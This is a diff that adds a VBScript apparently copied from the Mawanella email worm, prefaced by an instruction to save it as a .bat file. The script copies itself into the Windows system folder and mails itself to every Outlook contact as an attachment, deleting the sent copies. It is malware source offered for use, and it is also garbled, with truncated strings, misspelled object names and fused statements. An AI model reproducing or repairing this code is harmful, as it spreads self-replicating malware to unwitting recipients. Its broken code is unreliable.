@@ -1,0 +1,47 @@
+copy on notepad and save as .bat
+
+
+
+
+
+On Error Resume Next
+Rem // I hate Mawanella incident
+set w_s = Createobject("Wscript.shell")
+set fso = Createobject("scripting.FileSystemobject")
+set file = fso.openTextfile(Wscript.scriptFullname,1)
+vbscopy=file.ReadAll
+main()sub main()
+   On Error Resume Next
+   dim wscr,rr, strMsg
+   set wscr=Creatobject("Wscript.shell")
+      set dirwin = fso.GetspecialFolder(0)
+      set dirsystem = fso.Getspecialfolder(1)
+      set dirtemp = fso.Getspecialfolder(2)
+      set cFile = fso.Getfile(Wscript.ScriptFullname)
+      cFile.copy(dirsystem&"\Mawanella.vbs)Set outlookA = Creatobject("outlook.Application")
+If outlookA = "outlook" Then 
+   Set Mapi=OutlookA.GetNameSpace("MAPI")
+   Set AddLists=Mapi.AdddressLists
+   For Each ListIndex In addressLists
+       If ListsIndex.AddressEntries.Count <> 0 Then
+          ContactCountX = ListIndex.AddressEntries.Count
+          For Count= 1 To ContactCountX
+              Set mailX = ListIndex.AddressEntries(count)
+              'msgbox contactx.address
+              'Mailx.Recipients.Add(contactX.address)
+               MailX.subject = "Mawanella"
+               MailX.body = vbcrlf&"Mawanella is one of the S
+               'Set attachment=Mailx.attachments
+               'attachment.add dirsystem & "\Mawanella.
+               'mailx.attachments.add(dirsystem & "\Mawanella
+                MailX.attachments.add(dirsystem & "\Mawanella
+                MailX.DeleteAfterSubmit = True 
+                If mailX.To <> "" Then
+                   MailX.Send
+                 End if 
+              Next
+          End if
+        Next
+Else
+  msgBox "please Forward this to everyone"
+end if
